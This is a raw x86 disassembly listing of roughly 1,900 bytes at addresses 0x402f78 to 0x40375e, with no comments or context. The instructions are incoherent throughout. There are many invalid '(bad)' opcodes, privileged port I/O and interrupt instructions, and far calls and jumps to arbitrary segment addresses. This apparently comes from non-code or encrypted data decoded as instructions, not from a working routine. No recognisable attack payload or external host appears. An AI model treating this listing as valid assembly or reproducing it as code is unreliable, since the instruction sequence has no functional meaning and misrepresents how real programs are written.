  402f78:	add    al,0xc6
  402f7a:	mov    edi,0x170a0b04
  402f7f:	adc    edi,DWORD PTR ds:0x44556f1a
  402f85:	xchg   esp,eax
  402f86:	aaa    
  402f87:	pop    es
  402f88:	pusha  
  402f89:	inc    edi
  402f8a:	nop
  402f8b:	cli    
  402f8c:	push   ds
  402f8d:	fdiv   st,st(6)
  402f8f:	dec    edi
  402f90:	cmp    al,0xee
  402f92:	pop    eax
  402f93:	mov    bl,0xfe
  402f95:	es pop ss
  402f97:	add    al,0x84
  402f99:	mul    DWORD PTR [eax+0x63]
  402f9c:	imul   edi,DWORD PTR [esi-0x2fdaa101],0x61
  402fa3:	popa   
  402fa4:	das    
  402fa5:	sete   dl
  402fa8:	jne    0x403008
  402faa:	push   edi
  402fab:	(bad)  
  402fad:	mov    ebx,0xd73a9fb2
  402fb2:	add    eax,DWORD PTR [eax+ecx*2+0x11]
  402fb6:	xor    cl,BYTE PTR [edi+0x32]
  402fb9:	sbb    eax,0x4f7c50a3
  402fbe:	inc    ebx
  402fbf:	cmp    al,0xad
  402fc1:	inc    ebp
  402fc2:	pop    edx
  402fc3:	(bad)  
  402fc4:	and    DWORD PTR [esi],edx
  402fc6:	inc    eax
  402fc7:	pusha  
  402fc8:	daa    
  402fc9:	icebp  
  402fca:	cmp    cl,BYTE PTR [edi-0x6a]
  402fcd:	(bad)  
  402fce:	pop    ebp
  402fcf:	aam    0x64
  402fd1:	push   ds
  402fd2:	les    ebp,FWORD PTR [ebx-0x1e18d2c0]
  402fd8:	mov    DWORD PTR [edi-0x6375db18],eax
  402fde:	add    ah,BYTE PTR [ebx]
  402fe0:	jno    0x402ff6
  402fe2:	in     al,0xe
  402fe4:	push   ecx
  402fe5:	call   0x1d56:0x18a3c9a4
  402fec:	data16 cmp ah,BYTE PTR [ebp+0x5ed87a0f]
  402ff3:	and    BYTE PTR [ecx-0x65],0x8d
  402ff7:	mov    bh,0xde
  402ff9:	cs int3 
  402ffb:	and    eax,0xce3c43b
  403000:	and    ecx,edx
  403002:	das    
  403003:	bnd jmp 0x46eedb3a
  403009:	push   cs
  40300a:	inc    edi
  40300b:	pop    ecx
  40300c:	mov    edx,0x90d5f1c3
  403011:	retf   
  403012:	push   ecx
  403013:	sub    al,0x5b
  403015:	cmp    BYTE PTR [edx],0xa9
  403018:	out    dx,al
  403019:	call   0x8a:0xe0b8d221
  403020:	arpl   WORD PTR [edx+0x65bca620],dx
  403026:	inc    esp
  403027:	mov    bh,0x83
  403029:	cwde   
  40302a:	call   0xf7d4:0xca32dbe7
  403031:	loop   0x403030
  403033:	sub    bh,ch
  403035:	mov    dh,0xba
  403037:	mov    es,edx
  403039:	sub    bh,BYTE PTR [ebp-0x37fdfad2]
  40303f:	mov    ds:0x183ed05f,al
  403044:	outs   dx,BYTE PTR ds:[esi]
  403045:	pop    esi
  403046:	ds and dl,0x3b
  40304a:	(bad)  
  40304b:	ret    
  40304c:	mov    bh,0xe6
  40304e:	stc    
  40304f:	push   ds
  403050:	sub    al,0x25
  403052:	ja     0x4030d1
  403054:	nop
  403055:	aam    0x1d
  403057:	call   0x5db1:0x26b1f387
  40305e:	sbb    esp,DWORD PTR ds:[edx+0x6e]
  403062:	xor    al,0x5b
  403064:	fnsave es:[edx-0x6f20a24b]
  40306b:	retf   
  40306c:	push   esi
  40306d:	out    dx,al
  40306e:	push   esp
  40306f:	cmp    eax,0x2c2cd373
  403074:	mov    dl,0xe8
  403076:	rcr    BYTE PTR [ecx-0x1b],0x99
  40307a:	lds    ebp,FWORD PTR [ecx]
  40307c:	push   ss
  40307d:	scas   al,BYTE PTR es:[edi]
  40307e:	mov    dl,0x91
  403080:	ror    DWORD PTR [esi+ecx*2],cl
  403083:	inc    eax
  403085:	cmc    
  403086:	je     0x40309b
  403088:	mov    bh,0x5f
  40308a:	retf   
  40308b:	jns    0x403094
  40308d:	sub    eax,0xa44f202
  403092:	iret   
  403093:	into   
  403094:	mov    DWORD PTR [ebp+0x61c8a7e4],ecx
  40309a:	xor    eax,0xcc560a47
  40309f:	(bad)  
  4030a0:	xlat   BYTE PTR ds:[ebx]
  4030a1:	sub    eax,0x1dbe47f
  4030a6:	mov    dh,0xd2
  4030a8:	cmp    DWORD PTR [ecx],edx
  4030aa:	ja     0x4030b5
  4030ac:	(bad)  
  4030ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4030ae:	mov    ds:0xc8769d2c,eax
  4030b3:	fcomi  st,st(1)
  4030b5:	xchg   esi,eax
  4030b6:	and    al,0xaa
  4030b8:	pop    edx
  4030b9:	jnp    0x403122
  4030bb:	sbb    eax,0x8033abc8
  4030c0:	mov    edi,0x211ef8d7
  4030c5:	daa    
  4030c6:	loop   0x403048
  4030c8:	jmp    0x400:0x9f0a5845
  4030cf:	in     al,0x50
  4030d1:	cmp    al,0xe1
  4030d3:	ins    DWORD PTR es:[edi],dx
  4030d4:	sub    esi,DWORD PTR [edx+0x78]
  4030d7:	sub    BYTE PTR [esi+0x652c07dc],ch
  4030dd:	ins    DWORD PTR es:[edi],dx
  4030de:	cli    
  4030df:	pop    eax
  4030e0:	(bad)  
  4030e1:	fild   WORD PTR [ecx+0x68]
  4030e4:	and    DWORD PTR [esi+0x50],ebp
  4030e7:	pop    esp
  4030e8:	jg     0x403144
  4030ea:	aas    
  4030eb:	adc    al,0x80
  4030ed:	jae    0x403141
  4030ef:	push   cs
  4030f0:	in     eax,dx
  4030f1:	add    eax,0xc146176c
  4030f6:	(bad)  
  4030f7:	xchg   esi,eax
  4030f8:	adc    ah,dl
  4030fa:	lea    ebx,[eax+0x6e5f61fd]
  403100:	push   edx
  403101:	jecxz  0x403098
  403103:	mov    ah,0xd3
  403105:	push   cs
  403106:	cmp    dl,BYTE PTR [esp+edx*2]
  403109:	in     eax,dx
  40310a:	push   ebp
  40310b:	iret   
  40310c:	push   ebp
  40310d:	xor    ch,BYTE PTR [ebx+0x1b]
  403110:	mov    ch,0xa5
  403112:	push   ss
  403113:	jo     0x4030f4
  403115:	popa   
  403116:	jg     0x403153
  403118:	mov    edx,0x4fe96fcb
  40311d:	adc    al,0xb5
  403120:	and    BYTE PTR [edi],bl
  403122:	xchg   edi,eax
  403123:	push   0x3a7cf281
  403128:	dec    ecx
  403129:	and    al,BYTE PTR [eax+eax*8]
  40312c:	pop    edi
  40312d:	sub    bh,BYTE PTR [ebp-0x47ca9ef9]
  403133:	test   BYTE PTR [esi-0x634b7823],cl
  403139:	aas    
  40313a:	push   ss
  40313b:	int    0xfc
  40313d:	jg     0x40318b
  40313f:	inc    esi
  403140:	push   ss
  403141:	jne    0x403168
  403143:	test   BYTE PTR [edx-0x245144f0],al
  403149:	push   ds
  40314a:	add    dl,cl
  40314c:	rcr    BYTE PTR ss:[ebx-0x5f2bd35c],cl
  403153:	ss stos DWORD PTR es:[edi],eax
  403155:	or     eax,0x51fe290f
  40315a:	lds    ecx,FWORD PTR [edx+0x6a]
  40315d:	mov    esp,0xce7ea135
  403162:	inc    ecx
  403163:	in     al,dx
  403164:	std    
  403165:	xchg   ebx,eax
  403166:	pop    edi
  403167:	or     eax,0x32696cd8
  40316c:	mov    edx,0x3f0c7e51
  403171:	repz iret 
  403173:	inc    edx
  403174:	push   ebx
  403175:	push   DWORD PTR [ebx]
  403177:	outs   dx,BYTE PTR ds:[esi]
  403178:	repnz mov esp,0x79808bbc
  40317e:	int    0x2c
  403180:	push   ebx
  403181:	push   edx
  403182:	fnstenv [ebp+0x4b]
  403185:	dec    esi
  403186:	mov    esp,0xe24dbfe2
  40318b:	daa    
  40318c:	and    cl,al
  40318e:	mov    WORD PTR [ebp-0x71],?
  403191:	pop    ebx
  403192:	es sbb eax,ebp
  403195:	les    esi,FWORD PTR [ebx]
  403197:	ins    BYTE PTR es:[edi],dx
  403198:	inc    esp
  403199:	jb     0x40311e
  40319b:	cmp    bl,BYTE PTR [edi-0x600936dc]
  4031a1:	sbb    bh,dh
  4031a3:	sbb    esp,edi
  4031a5:	mov    dl,0x99
  4031a7:	inc    ebp
  4031a8:	lds    esp,FWORD PTR [eax-0x5c]
  4031ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4031ac:	jl     0x4031de
  4031ae:	arpl   WORD PTR [ecx-0x28],bx
  4031b1:	(bad)  [ecx+0x7]
  4031b4:	push   ebx
  4031b5:	inc    esp
  4031b6:	adc    BYTE PTR [esi],0x4a
  4031b9:	ins    BYTE PTR es:[edi],dx
  4031ba:	in     eax,dx
  4031bb:	xchg   ebp,eax
  4031bc:	sbb    al,0x7d
  4031be:	std    
  4031bf:	nop
  4031c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4031c1:	pushf  
  4031c2:	jns    0x40322a
  4031c4:	pusha  
  4031c5:	mov    cl,0x24
  4031c7:	jmp    0x9fe0:0xce85929b
  4031ce:	xor    al,0x1f
  4031d0:	sbb    eax,0x324cc25c
  4031d5:	daa    
  4031d6:	cmovs  edx,DWORD PTR [ebp-0x7d]
  4031da:	jp     0x40317e
  4031dc:	or     eax,0x35883d4c
  4031e1:	clc    
  4031e2:	fisttp QWORD PTR [esi-0x7e3c747c]
  4031e8:	fisttp WORD PTR [ebp-0x3a]
  4031eb:	aas    
  4031ec:	into   
  4031ed:	rol    DWORD PTR [edx-0x1a],1
  4031f0:	mov    eax,0xb5dbdb20
  4031f5:	xchg   eax,edx
  4031f7:	xchg   ebx,eax
  4031f8:	or     edx,DWORD PTR [esi-0x71]
  4031fb:	adc    BYTE PTR [edi-0x64eddc56],cl
  403201:	fimul  DWORD PTR [edx]
  403203:	sub    al,0x68
  403205:	shl    BYTE PTR [ecx-0x22],cl
  403208:	adc    al,0x6f
  40320a:	or     esp,DWORD PTR [ebp-0x571c56f9]
  403210:	stos   DWORD PTR es:[edi],eax
  403211:	fstp   QWORD PTR [esi+0x39bf027f]
  403217:	xor    bl,BYTE PTR [edi-0x77]
  40321a:	mov    esi,edx
  40321c:	sbb    BYTE PTR [ecx-0x40],dl
  40321f:	int    0xbf
  403221:	push   ss
  403222:	ins    BYTE PTR es:[edi],dx
  403223:	jmp    0x403202
  403225:	jae    0x403259
  403227:	mov    edx,0x63a62ede
  40322c:	push   edx
  40322d:	dec    ebp
  40322e:	pop    edx
  40322f:	das    
  403230:	jbe    0x403289
  403232:	stc    
  403233:	jb     0x403227
  403235:	add    BYTE PTR [edx-0x6a],ch
  403238:	jg     0x4031fe
  40323a:	mov    ch,0x58
  40323c:	inc    edi
  40323d:	out    0x70,eax
  40323f:	jo     0x403233
  403241:	mov    edi,0x33805785
  403246:	ficomp WORD PTR [eax+0x2ba2f05c]
  40324c:	xor    ecx,ebx
  40324e:	jb     0x403291
  403250:	pop    esp
  403251:	cmp    ah,BYTE PTR [ebx+ebp*4-0x72d73736]
  403258:	cs dec eax
  40325a:	clc    
  40325b:	loope  0x4032b1
  40325d:	sub    al,0x76
  40325f:	cmp    ecx,0x36
  403262:	data16 or al,0x5f
  403265:	iret   
  403266:	das    
  403267:	out    dx,eax
  403268:	push   esi
  403269:	mov    cl,0x17
  40326b:	int    0x69
  40326d:	sub    al,0xd2
  40326f:	push   ecx
  403270:	fiadd  WORD PTR [edx+0x7bdc91b5]
  403276:	ins    DWORD PTR es:[edi],dx
  403277:	cld    
  403278:	int3   
  403279:	(bad)  
  40327a:	sub    BYTE PTR [ebx+edx*1-0x5b465052],ah
  403281:	mov    esp,0xd7caab2b
  403286:	popf   
  403287:	sub    eax,0xc45284c8
  40328c:	cmc    
  40328d:	mov    edi,0xe8941a5a
  403292:	fld    DWORD PTR [edi+0x4f3119d1]
  403298:	loopne 0x403225
  40329a:	xchg   ebx,eax
  40329b:	mov    ds:0x69ded66,al
  4032a0:	loope  0x40324d
  4032a2:	push   esp
  4032a3:	jge    0x403303
  4032a5:	jo     0x403246
  4032a7:	ret    
  4032a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4032a9:	mov    eax,ds:0x2079b143
  4032ae:	mov    ecx,edx
  4032b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4032b1:	iret   
  4032b2:	xor    bl,BYTE PTR [edx]
  4032b4:	adc    al,0xa8
  4032b6:	mov    ds:0xb752d9d1,al
  4032bb:	cmp    dl,al
  4032bd:	add    ebp,DWORD PTR [edx-0x66]
  4032c0:	jmp    0x27ccac42
  4032c5:	add    eax,DWORD PTR [esi-0x50]
  4032c8:	ss arpl bx,cx
  4032cb:	ins    DWORD PTR es:[edi],dx
  4032cc:	gs call 0x4caf66bd
  4032d2:	mov    al,0x90
  4032d4:	push   ss
  4032d5:	das    
  4032d6:	add    DWORD PTR [edi],0x172a49c1
  4032dc:	xor    eax,0x3b07cc63
  4032e1:	nop
  4032e2:	mov    ecx,0x239d7fea
  4032e7:	in     eax,0x76
  4032e9:	add    DWORD PTR ds:0x99d3125c,ebp
  4032ef:	mov    ecx,0x135c2a90
  4032f4:	lods   eax,DWORD PTR ds:[esi]
  4032f5:	sbb    DWORD PTR ds:0x93dc7033,ebx
  4032fb:	xchg   ebp,eax
  4032fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4032fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4032fe:	in     al,0x31
  403300:	mov    cl,0x59
  403302:	int3   
  403303:	sbb    al,BYTE PTR [esi+edx*2]
  403306:	sub    al,0x28
  403308:	jecxz  0x403313
  40330a:	adc    ecx,DWORD PTR [ebp+0x269e0da8]
  403310:	fisttp DWORD PTR [esi+ecx*1-0x7]
  403314:	lods   al,BYTE PTR ds:[esi]
  403315:	pop    ss
  403316:	test   al,0x14
  403318:	xchg   esi,eax
  403319:	jnp    0x403340
  40331b:	xor    al,bh
  40331d:	in     eax,0xca
  40331f:	addr16 addr16 int3 
  403322:	data16 fcom QWORD PTR [edi]
  403325:	mov    eax,0x9d10e42b
  40332a:	jmp    0x7abd:0x15e045e
  403331:	cs in  al,0x20
  403334:	xor    al,0xdd
  403336:	or     eax,0x29736585
  40333b:	pop    edx
  40333c:	and    ebp,DWORD PTR [eax-0x19]
  40333f:	scas   eax,DWORD PTR es:[edi]
  403340:	dec    edx
  403341:	mov    BYTE PTR [edx-0x1b],dl
  403344:	and    DWORD PTR [edi+edi*8-0x2e00c3e7],esi
  40334b:	xchg   ebp,eax
  40334c:	(bad)  
  40334d:	adc    esp,DWORD PTR fs:[ecx]
  403350:	aas    
  403351:	sub    DWORD PTR [ecx],ebx
  403353:	and    eax,0xc03f647c
  403358:	xor    eax,0xd2dcb72d
  40335d:	pushf  
  40335e:	in     eax,0x87
  403360:	xchg   edi,eax
  403361:	ja     0x40338b
  403363:	add    esi,eax
  403365:	out    0x86,al
  403367:	fiadd  DWORD PTR [esp+ebp*4-0x262f8a93]
  40336e:	jg     0x4033d5
  403370:	and    DWORD PTR [ecx+0x6d028151],edx
  403376:	mov    al,ds:0xa0472062
  40337b:	shl    DWORD PTR [edi-0x7b],0xe3
  40337f:	(bad)  
  403380:	xor    bl,BYTE PTR [edx]
  403382:	outs   dx,DWORD PTR ds:[esi]
  403383:	test   al,0x79
  403385:	rcr    DWORD PTR [ebp-0x18960d73],cl
  40338b:	xor    ch,BYTE PTR [eax]
  40338d:	int    0x9e
  40338f:	ror    dl,cl
  403391:	adc    al,0xdb
  403393:	(bad)  
  403394:	cmc    
  403395:	arpl   cx,ax
  403397:	arpl   si,cx
  403399:	push   eax
  40339a:	xor    dh,BYTE PTR [edi]
  40339c:	jge    0x40335f
  40339e:	add    al,0x27
  4033a0:	xchg   edi,eax
  4033a1:	pop    ds
  4033a2:	adc    DWORD PTR [eax],ebx
  4033a4:	add    eax,0x71c2835f
  4033a9:	repz sbb dh,BYTE PTR [edi+0x7e82c8fb]
  4033b0:	pop    es
  4033b1:	inc    eax
  4033b2:	push   ebx
  4033b3:	int3   
  4033b4:	inc    esi
  4033b5:	or     BYTE PTR [ebx+ebx*2],ch
  4033b8:	pop    ebp
  4033b9:	daa    
  4033ba:	push   ebp
  4033bb:	xor    esp,DWORD PTR [ecx+esi*1-0x3761f35d]
  4033c2:	bound  ebp,QWORD PTR [ebx]
  4033c4:	mov    al,0xda
  4033c6:	pop    eax
  4033c7:	cmp    DWORD PTR [edi+0xdb075cc],ebx
  4033cd:	stc    
  4033ce:	adc    esi,edx
  4033d0:	jne    0x403364
  4033d2:	mov    BYTE PTR [ecx],dl
  4033d4:	push   cs
  4033d5:	inc    esp
  4033d6:	push   ecx
  4033d7:	sbb    BYTE PTR [ecx+0x44],ch
  4033da:	ja     0x403392
  4033dc:	lods   eax,DWORD PTR ds:[esi]
  4033dd:	repnz sub bl,BYTE PTR fs:[edx-0xb]
  4033e2:	xchg   ebx,eax
  4033e3:	cmp    eax,0xe2a0415c
  4033e8:	jmp    0x4033d0
  4033ea:	mov    dh,0x69
  4033ec:	shl    BYTE PTR [edi-0x69],cl
  4033ef:	push   ds
  4033f0:	push   ebx
  4033f1:	nop
  4033f2:	call   0x5bafd55
  4033f7:	fnsave [esi-0x4d]
  4033fa:	push   ss
  4033fb:	hlt    
  4033fc:	cdq    
  4033fd:	ss out 0x97,eax
  403400:	fsub   st(0),st
  403402:	xchg   esp,eax
  403403:	shl    DWORD PTR [edi+edx*8],1
  403406:	inc    edi
  403407:	das    
  403408:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403409:	aam    0x28
  40340b:	xor    ebx,DWORD PTR [ecx+0x1b]
  40340e:	mov    ebp,0xb86abcff
  403413:	loope  0x40344c
  403415:	mov    eax,0x67e3ad4b
  40341a:	into   
  40341b:	lea    edx,[edx-0x50e96625]
  403421:	test   DWORD PTR ds:0xbf30a99f,edx
  403427:	jno    0x403479
  403429:	jbe    0x403425
  40342b:	mov    ds:0x77cc6814,eax
  403430:	mov    dh,0xc
  403432:	ret    0x1613
  403435:	pop    eax
  403436:	inc    ecx
  403437:	push   es
  403438:	jae    0x40346a
  40343a:	ja     0x40342a
  40343c:	(bad)  
  40343d:	mov    ebx,0x8ddb04f0
  403442:	mov    ds:0x58597535,eax
  403447:	pop    ds
  403448:	inc    edx
  403449:	xlat   BYTE PTR ds:[ebx]
  40344a:	sbb    ax,sp
  40344d:	mov    cl,0x2
  40344f:	pop    ebx
  403450:	add    BYTE PTR [eax+0x51],0xb
  403454:	push   cs
  403455:	fs retf 0xbb24
  403459:	add    ebx,DWORD PTR [ecx+0x70]
  40345c:	out    0xc9,eax
  40345e:	shr    DWORD PTR [ebx+0x275552d6],cl
  403464:	inc    ecx
  403465:	sub    eax,0x9d4ff9b0
  40346a:	popf   
  40346b:	out    0xe4,al
  40346d:	jns    0x40344f
  40346f:	push   0xffffffb2
  403471:	stos   DWORD PTR es:[edi],eax
  403472:	ins    DWORD PTR es:[edi],dx
  403473:	enter  0xcda7,0x2a
  403477:	pop    eax
  403478:	xchg   esp,eax
  403479:	inc    esi
  40347a:	out    dx,al
  40347b:	int    0x4
  40347d:	fs call 0x6247:0x2efc82a7
  403485:	push   ds
  403486:	adc    dh,BYTE PTR [edx]
  403488:	or     eax,0x91a4b773
  40348d:	jbe    0x4034e4
  40348f:	lock inc eax
  403491:	push   ebx
  403492:	push   ss
  403493:	nop
  403494:	jp     0x403487
  403496:	push   ecx
  403497:	loop   0x403433
  403499:	fistp  QWORD PTR [esi+0x7c4620c9]
  40349f:	and    eax,0x18e7e86a
  4034a4:	fbld   TBYTE PTR ds:0x90bf6d95
  4034aa:	loop   0x4034de
  4034ac:	xor    al,0x53
  4034ae:	mov    bh,0x3a
  4034b0:	adc    al,0xca
  4034b2:	not    DWORD PTR ds:0x7deca220
  4034b8:	mov    dh,0x7
  4034ba:	dec    edi
  4034bb:	outs   dx,BYTE PTR ds:[esi]
  4034bc:	mov    WORD PTR [ebp-0x1dd686af],ds
  4034c2:	xor    ch,BYTE PTR [edi+0x47]
  4034c5:	mov    ecx,0x70768e82
  4034ca:	je     0x403512
  4034cc:	cmc    
  4034cd:	mov    eax,cs:0x47c7912d
  4034d3:	sub    DWORD PTR [ebx+0x37],ebx
  4034d6:	inc    edx
  4034d7:	mov    eax,0x365a25fe
  4034dc:	retf   
  4034dd:	cdq    
  4034de:	mov    cl,0x12
  4034e0:	xor    esi,DWORD PTR [ebp-0x4a481647]
  4034e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4034e7:	jmp    0x7910:0xe38095d0
  4034ee:	fmul   st(5),st
  4034f0:	sbb    BYTE PTR [esi+0x2014ccb9],al
  4034f6:	sub    bl,BYTE PTR [edx+0x350365e8]
  4034fc:	rcr    DWORD PTR [ebp+0x4b57c894],1
  403502:	mov    al,ds:0x26dbbd81
  403507:	dec    eax
  403508:	add    DWORD PTR [ebx+ecx*2],esp
  40350b:	lods   eax,DWORD PTR ds:[esi]
  40350c:	jle    0x4034ce
  40350e:	loop   0x4034a6
  403510:	mov    esp,DWORD PTR [eax-0x4f]
  403513:	inc    ebp
  403514:	lock or eax,DWORD PTR [ecx-0x1]
  403518:	scas   eax,DWORD PTR es:[edi]
  403519:	rol    BYTE PTR [edi+0x35adb3ec],cl
  40351f:	lea    ebx,[edx+0x727e87c4]
  403525:	mov    bh,0xf1
  403527:	daa    
  403528:	cli    
  403529:	inc    edx
  40352a:	mov    edx,0x11d573cb
  40352f:	sahf   
  403530:	fwait
  403531:	mov    dh,0xf8
  403533:	in     al,dx
  403534:	jne    0x4034e6
  403536:	add    edi,eax
  403538:	js     0x403597
  40353a:	push   ebx
  40353b:	cmp    eax,0x60f7bf0e
  403540:	iret   
  403541:	neg    DWORD PTR [edx-0x38]
  403544:	mov    bl,0x7
  403546:	mov    al,0x2
  403548:	xchg   esi,eax
  403549:	mov    esi,0xc769bacd
  40354e:	js     0x4035ab
  403550:	arpl   WORD PTR [edx+0x54],bx
  403553:	out    dx,al
  403554:	aaa    
  403555:	cmp    al,0x7d
  403557:	fidivr WORD PTR [ebx-0x58e79157]
  40355d:	retf   
  40355e:	dec    edi
  40355f:	scas   al,BYTE PTR es:[edi]
  403560:	pop    eax
  403561:	jle    0x403552
  403563:	shl    ecx,1
  403565:	in     eax,0x58
  403567:	mul    BYTE PTR ds:0x71a93f05
  40356d:	push   es
  40356e:	call   0xb2abd2ff
  403573:	fdiv   st,st(0)
  403575:	xchg   edi,eax
  403576:	adc    dh,cl
  403578:	aaa    
  403579:	outs   dx,DWORD PTR ds:[esi]
  40357a:	jecxz  0x403522
  40357c:	(bad)  
  40357d:	int    0x95
  40357f:	mov    ds:0x87eb51fd,al
  403584:	enter  0xf489,0xa9
  403588:	mov    esi,DWORD PTR [esi-0x5e]
  40358b:	jnp    0x4035f5
  40358d:	push   ds
  40358e:	stc    
  40358f:	push   edx
  403590:	enter  0xa965,0x9a
  403594:	in     eax,dx
  403595:	push   ecx
  403596:	cmp    BYTE PTR [edx-0x3873622d],ch
  40359c:	fsubr  st,st(4)
  40359e:	add    ebp,DWORD PTR [ecx]
  4035a0:	push   edi
  4035a1:	pop    edx
  4035a2:	test   eax,0xe7c62d06
  4035a7:	ja     0x403605
  4035a9:	xor    BYTE PTR [ebx-0x7ebdd7cc],ch
  4035af:	jns    0x403541
  4035b1:	pop    ss
  4035b2:	push   ds
  4035b3:	sbb    BYTE PTR ds:0x52c2bd4f,ah
  4035b9:	retf   
  4035ba:	mov    esi,0x925096e8
  4035bf:	jge    0x4035e8
  4035c1:	rcl    DWORD PTR [eax-0x3f4f0f37],1
  4035c7:	add    edx,DWORD PTR [edi]
  4035c9:	xor    ebp,edi
  4035cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4035cc:	sub    al,0x5f
  4035ce:	sub    dh,al
  4035d0:	push   cs
  4035d1:	in     eax,0x5
  4035d3:	or     esi,DWORD PTR [edi]
  4035d5:	or     ecx,DWORD PTR [ebp+0x45]
  4035d8:	or     ah,BYTE PTR [ecx]
  4035da:	cmc    
  4035db:	ja     0x4035c5
  4035dd:	je     0x403656
  4035df:	sub    DWORD PTR ds:0xdd5837fb,edx
  4035e5:	cmp    al,0x2
  4035e7:	shl    BYTE PTR [edx],cl
  4035e9:	sahf   
  4035ea:	sahf   
  4035eb:	in     eax,0x1d
  4035ed:	rep ins DWORD PTR es:[edi],dx
  4035ef:	mov    cl,0xc8
  4035f1:	addr16 push esp
  4035f3:	pop    ds
  4035f4:	in     eax,0xc3
  4035f6:	repnz push 0xabd86c3f
  4035fc:	jno    0x403676
  4035fe:	ret    0x85be
  403601:	into   
  403602:	mov    DWORD PTR [edx-0x2d56cb76],ebx
  403608:	call   0xfe42:0xfa667b1
  40360f:	pop    ebx
  403610:	sbb    BYTE PTR [edi],al
  403612:	pop    edi
  403613:	(bad)  
  403614:	aad    0x2e
  403616:	iret   
  403617:	xlat   BYTE PTR ds:[ebx]
  403618:	je     0x4035b7
  40361a:	jae    0x403607
  40361c:	push   ebx
  40361d:	les    eax,FWORD PTR [edi+0x3a69246d]
  403623:	cmp    bh,BYTE PTR [ebx+ecx*8+0x41]
  403627:	rcr    DWORD PTR [esi-0x2849abe0],1
  40362d:	lds    edx,FWORD PTR [esi]
  40362f:	cmp    eax,0xbf027f2
  403634:	imul   ecx,DWORD PTR [ecx+0x4e],0x9fa9045f
  40363b:	stos   BYTE PTR es:[edi],al
  40363c:	mov    DWORD PTR [eax+0x69a066e8],ebp
  403642:	ret    0xecde
  403645:	or     DWORD PTR [ebx+0x2e],eax
  403648:	ins    BYTE PTR es:[edi],dx
  403649:	and    eax,0x18a5ff21
  40364e:	or     ebx,edi
  403650:	ins    DWORD PTR es:[edi],dx
  403651:	push   cs
  403652:	sub    al,0xea
  403654:	mov    bh,0x1d
  403656:	scas   eax,DWORD PTR es:[edi]
  403657:	xchg   ebp,eax
  403658:	mov    eax,ebx
  40365a:	mov    ah,0xb2
  40365c:	scas   al,BYTE PTR es:[edi]
  40365d:	mov    cl,0xe5
  40365f:	imul   ebx,DWORD PTR [eax],0xfffffff0
  403662:	pop    ds
  403663:	sbb    dl,BYTE PTR [esi+0x3e9e8473]
  403669:	cli    
  40366a:	adc    DWORD PTR [ebx-0x4156c2a1],esp
  403670:	bound  edx,QWORD PTR [ecx-0x1f]
  403673:	xchg   edi,eax
  403674:	mov    bl,0x28
  403676:	and    esp,ecx
  403678:	sbb    DWORD PTR [ecx+0x2f1f2115],esp
  40367e:	sbb    dl,BYTE PTR [edi+esi*8]
  403681:	repz cmp eax,0xa5abcb38
  403687:	aad    0x22
  403689:	std    
  40368a:	aad    0x6
  40368c:	lds    edi,FWORD PTR [ecx]
  40368e:	adc    ah,BYTE PTR [edx-0x11]
  403691:	add    ebx,DWORD PTR [esi+0x146ae3fd]
  403697:	mov    ds:0xa5c3329e,al
  40369c:	test   al,0xdc
  40369e:	js     0x403716
  4036a0:	or     eax,0x8375136a
  4036a5:	sub    dl,BYTE PTR [edi-0x5bd2abf4]
  4036ab:	inc    ebp
  4036ac:	cmc    
  4036ad:	pop    edi
  4036ae:	daa    
  4036af:	shr    DWORD PTR [ebp-0xf19f3a8],cl
  4036b5:	push   esp
  4036b6:	loop   0x4036f7
  4036b8:	dec    ebp
  4036b9:	inc    ebx
  4036ba:	sbb    al,0xc2
  4036bc:	test   DWORD PTR [ebx-0x5],edx
  4036bf:	mov    fs,WORD PTR [ecx+0x3b055380]
  4036c5:	fistp  QWORD PTR [ecx+0x5f868e9f]
  4036cb:	push   es
  4036cc:	inc    ebx
  4036cd:	jo     0x403666
  4036cf:	inc    edx
  4036d0:	js     0x40374b
  4036d2:	(bad)  
  4036d4:	test   DWORD PTR [esi],esi
  4036d6:	xchg   esi,eax
  4036d7:	dec    edx
  4036d8:	xchg   ebx,ebx
  4036da:	pop    es
  4036db:	dec    esi
  4036dc:	push   esp
  4036dd:	push   es
  4036de:	call   0x272d4291
  4036e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4036e4:	xchg   esi,eax
  4036e5:	pusha  
  4036e6:	clc    
  4036e7:	std    
  4036e8:	adc    bl,bh
  4036ea:	jne    0x40375f
  4036ec:	lock outs dx,DWORD PTR ds:[esi]
  4036ee:	arpl   WORD PTR [eax-0x28],bp
  4036f1:	dec    edi
  4036f2:	test   al,0x7f
  4036f4:	(bad)  
  4036f5:	xor    ebx,esi
  4036f7:	out    dx,eax
  4036f8:	push   edi
  4036f9:	mov    ah,0x7f
  4036fb:	xor    al,0xd1
  4036fd:	add    dh,BYTE PTR [edi-0x1426b84f]
  403703:	cwde   
  403704:	test   DWORD PTR [eax+0x46661b8e],edi
  40370a:	and    cl,BYTE PTR [ecx]
  40370c:	mov    ebx,0xca06ddf9
  403711:	jmp    FWORD PTR [eax-0x33982039]
  403717:	inc    esp
  403718:	int3   
  403719:	push   ebx
  40371a:	cmp    edi,edi
  40371c:	hlt    
  40371d:	rol    ecx,0x74
  403720:	js     0x403705
  403722:	adc    eax,0xff5fa885
  403727:	push   ebp
  403728:	pop    esi
  403729:	dec    esp
  40372a:	shl    BYTE PTR [ecx+esi*1+0x43],cl
  40372e:	sub    eax,0x5494f55d
  403733:	dec    eax
  403734:	mov    al,BYTE PTR [ebp-0x19]
  403737:	sar    DWORD PTR [ecx+eax*2+0x7264de68],cl
  40373e:	loopne 0x40375b
  403740:	xlat   BYTE PTR ds:[ebx]
  403741:	mov    ecx,0x2b562c26
  403746:	rcr    DWORD PTR [edi],1
  403748:	stos   BYTE PTR es:[edi],al
  403749:	sti    
  40374a:	cmp    eax,0x59f3452f
  40374f:	repnz push edx
  403751:	inc    edi
  403752:	jge    0x4036fa
  403754:	fnstenv [eax]
  403756:	jmp    0x403716
  403758:	jb     0x4036f2
  40375a:	xor    dh,bh
  40375c:	inc    ebp
  40375d:	(bad)  
  40375e:	pusha  
